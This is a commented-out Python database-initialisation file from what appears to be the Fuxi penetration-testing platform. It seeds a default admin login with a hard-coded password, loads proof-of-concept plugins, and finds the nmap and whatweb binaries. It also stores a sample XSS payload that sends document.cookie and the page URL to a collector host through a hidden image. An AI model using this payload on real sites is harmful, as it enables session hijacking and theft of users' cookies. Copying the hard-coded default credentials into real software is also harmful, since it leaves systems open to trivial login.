#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : jeffzhang
# @Time    : 2019/5/22
# @File    : db_init.py
# @Desc    : ""
#
# import os
# import re
# import subprocess
# import sys
# from fuxi.common.utils.logger import logger
# from sqlalchemy.exc import OperationalError
# from fuxi.common.utils.poc_handler import poc_parser
# from fuxi.core.databases.orm.auth.user_orm import DBFuxiAdmin
# from fuxi.core.databases.orm.scanner.pocsuite_orm import DBPocsuitePlugin
# from fuxi.core.databases.orm.exploit.xss_orm import DBXssPayloads
# from fuxi.core.databases.orm.configuration.config import DBFuxiConfiguration
#
# def databases_init():
#     try:
#         if not DBFuxiAdmin.find_one():
#             # fuxi console default login user and password (user: fuxi password: whoami)
#             DBFuxiAdmin.add_admin(
#                 username="fuxi", password="whoami",
#                 nick="Administrator", email="admin@fuxi.com",
#             )
#         if not DBPocsuitePlugin.find_one():
#             # pocsuit plugin initialization
#             _poc_path = os.path.abspath(os.path.dirname(__file__)) + "/pocs"
#             for poc_filename in os.listdir(_poc_path):
#                 with open(_poc_path + "/" + poc_filename, "r", encoding="UTF-8") as poc_read:
#                     poc_str = poc_read.read()
#                     poc_data = poc_parser(poc_str)
#                     DBPocsuitePlugin.add(
#                         name=poc_data['name'], poc_str=poc_str, filename=poc_filename,
#                         app=poc_data['app'], poc_type=poc_data['type'], op="fuxi"
#                     )
#     except OperationalError:
#         # catch database connect exception
#         logger.error("OperationalError: can't connect to database server")
#         sys.exit(0)
#     except Exception as e:
#         # catch database error
#         logger.error("database initialization failure: {}".format(e))
#         sys.exit(0)
#
#     if not DBXssPayloads.find_one():
#         # xss payload example
#         name = "get document.cookie"
#         value = "var api = 'http://127.0.0.1:50020';\n" \
#                 "var url = document.location.href;\n" \
#                 "var salt = 'abcde';\n" \
#                 "var data = 'cookie=' + encodeURIComponent(document.cookie);\n" \
#                 "var img = document.createElement('img');\n" \
#                 "img.width = 0; img.height = 0;\n" \
#                 "img.src = api+'/xss?salt='+salt+'&url='+encodeURIComponent(url)+'&data='+ encodeURIComponent(data);"
#         DBXssPayloads.add(name, value)
#
#     if not DBFuxiConfiguration.find_one():
#         # base configuration
#         cid = DBFuxiConfiguration.config_init()
#         x = FuxiConfigInit(cid)
#         if not x.set_whatweb_exe():
#             logger.warning("Configuration init: whatweb cannot found")
#         if not x.set_nmap_exe():
#             logger.warning("Configuration init: nmap cannot found")
#
#
# class FuxiConfigInit(object):
#     def __init__(self, cid):
#         self.cid = cid
#
#     def set_whatweb_exe(self):
#         re_compile = re.compile('WhatWeb version ([\d]+)\.([\d]+)(?:\.([\d])+)')
#         for exe in ["/usr/local/bin/whatweb", "/usr/bin/whatweb", "whatweb"]:
#             subp = subprocess.run("{} --version".format(exe), shell=True, encoding="utf-8",
#                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
#             if re_compile.match(subp.stdout):
#                 DBFuxiConfiguration.update_by_id(self.cid, {
#                     "whatweb_exe": exe,
#                 })
#                 return True
#         return False
#
#     def set_nmap_exe(self):
#         re_compile = re.compile("([\s]*)Starting Nmap ([\d]+)\.([\d]+)")
#         for exe in ["/usr/local/bin/nmap", "/usr/bin/nmap", "nmap"]:
#             subp = subprocess.run("{} -v".format(exe), shell=True, encoding="utf-8",
#                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
#             if re_compile.match(subp.stdout):
#                 DBFuxiConfiguration.update_by_id(self.cid, {
#                     "nmap_exe": exe,
#                 })
#                 return True
#         return False
